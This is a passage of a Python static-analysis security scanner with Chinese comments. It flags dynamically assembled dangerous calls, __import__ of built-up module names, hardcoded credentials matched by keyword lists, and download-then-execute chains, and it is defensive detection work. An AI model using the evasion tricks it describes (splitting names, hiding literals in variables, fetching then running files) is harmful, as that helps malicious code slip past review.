        if isinstance(node, ast.Constant) and isinstance(node.value, str):
            return node.value
        if isinstance(node, ast.BinOp) and isinstance(node.op, ast.Add):
            left = DynamicCallVisitor._const_str(node.left)
            right = DynamicCallVisitor._const_str(node.right)
            if left is not None and right is not None:
                return left + right
        if isinstance(node, ast.JoinedStr):
            parts = []
            for v in node.values:
                if isinstance(v, ast.Constant) and isinstance(v.value, str):
                    parts.append(v.value)
                else:
                    return None
            return "".join(parts)
        return None

    def visit_Call(self, node: ast.Call):
        # ① getattr(obj, "危险名") 形式：名字是折叠出来的常量
        func = node.func
        if isinstance(func, ast.Name) and func.id == "getattr" and len(node.args) >= 2:
            name = self._const_str(node.args[1])
            if name and name in self.DANGEROUS_ATTRS:
                self.findings.append(AstFinding(
                    severity="HIGH",
                    message="通过 getattr 动态取用危险函数 %r（名字由常量拼出，绕开了字面规则）"
                            % name,
                    line=node.lineno, col=node.col_offset
                ))

        # ② d.__dict__["危险名"] 或 globals()["危险名"] 形式
        if isinstance(func, ast.Subscript):
            key = self._const_str(func.slice)
            if key and key in self.DANGEROUS_ATTRS:
                obj = func.value
                is_dictish = (isinstance(obj, ast.Attribute) and obj.attr == "__dict__") \
                    or (isinstance(obj, ast.Call) and isinstance(obj.func, ast.Name)
                        and obj.func.id in ("globals", "locals", "vars"))
                if is_dictish:
                    self.findings.append(AstFinding(
                        severity="HIGH",
                        message="通过 __dict__/globals 下标取用危险函数 %r（绕开了属性访问字面规则）"
                                % key,
                        line=node.lineno, col=node.col_offset
                    ))

        # ③ __import__("o" + "s") 这种拼出来的模块名，落到危险模块要升级
        if isinstance(func, ast.Name) and func.id == "__import__" and node.args:
            mod = self._const_str(node.args[0])
            if mod and mod.split(".")[0] in self.IMPORT_MODULES:
                self.findings.append(AstFinding(
                    severity="HIGH",
                    message="__import__ 动态导入危险模块 %r（模块名由常量拼出）" % mod,
                    line=node.lineno, col=node.col_offset
                ))

        self.generic_visit(node)


class HardcodedSecretVisitor(ast.NodeVisitor):
    """Find hardcoded secrets in assignments."""

    SECRET_PATTERNS = ["api_key", "apikey", "secret", "token", "password", "passwd", "credential"]
    # 变量名形如 secret_re / token_regex / password_pattern —— 是检测规则的正则，
    # 不是凭证本身。扫描器扫自己时这里必然自命中，必须排除。
    REGEX_SUFFIXES = ("_re", "_regex", "_pattern", "_matcher", "_patterns")

    def __init__(self):
        self.findings: List[AstFinding] = []

    def visit_Assign(self, node: ast.Assign):
        for target in node.targets:
            if isinstance(target, ast.Name):
                var_name = target.id.lower()
                if var_name.endswith(self.REGEX_SUFFIXES):
                    continue
                if any(pat in var_name for pat in self.SECRET_PATTERNS):
                    if isinstance(node.value, ast.Constant) and isinstance(node.value.value, str):
                        if len(node.value.value) >= 8:
                            self.findings.append(AstFinding(
                                severity="CRITICAL",
                                message=f"硬编码凭证: {target.id}",
                                line=node.lineno,
                                col=node.col_offset
                            ))
        self.generic_visit(node)


def analyze_python_file(filepath: Path) -> List[AstFinding]:
    """Analyze a Python file with AST, return findings."""
    try:
        content = filepath.read_text(encoding="utf-8", errors="replace")
        tree = ast.parse(content, filename=str(filepath))
    except Exception:
        return []

    findings = []

    # §3bf：先收常量表，再判——否则"把字面量藏进变量"就是一条免费后门
    consts, temps, lists = collect_consts(tree)
    aliases = collect_func_aliases(tree)

    # Dangerous calls
    call_visitor = DangerousCallVisitor()
    call_visitor.consts = consts
    call_visitor.temps = temps
    call_visitor.lists = lists
    call_visitor.aliases = aliases
    call_visitor.visit(tree)
    findings.extend(call_visitor.findings)

    # 名字被拆开/动态取用的危险调用（§3av）
    dyn_visitor = DynamicCallVisitor()
    dyn_visitor.visit(tree)
    findings.extend(dyn_visitor.findings)

    # Hardcoded secrets
    secret_visitor = HardcodedSecretVisitor()
    secret_visitor.visit(tree)
    findings.extend(secret_visitor.findings)

    # §3bl：两步链路——下载了哪个文件，之后又执行了哪个文件（含跨行）
    base_dir = filepath.parent
    two = TwoStepExecVisitor(str(base_dir))
    two.prepare(tree)
    two.visit(tree)
    hit = None
    for ex_path, line in two.execs:
        for dl_path, _dl_line in two.downloads:
            if _same_path(dl_path, ex_path):
                hit = (ex_path, line)
                break
        if hit:
            break
    if hit:
        findings.append(AstFinding(
            severity="CRITICAL",
            message="取回后落盘再执行：先下载 %s，随后执行同一路径（两步链路）" % hit[0],
            line=hit[1], col=0))
    else:
        # 命令写在文件里：把文件内容读进来判，而不是只看文件名
        for ex_path, line in two.execs:
            v = _script_file_verdict(ex_path, base_dir)
            if v:
                findings.append(AstFinding(severity=v[0], message=v[1], line=line, col=0))
                break

    return findings


if __name__ == "__main__":
    import sys
    if len(sys.argv) < 2:
        print("Usage: python ast_analyzer.py <file.py>")
        sys.exit(1)

    findings = analyze_python_file(Path(sys.argv[1]))
    for f in findings:
        print(f"[{f.severity}] line {f.line}: {f.message}")
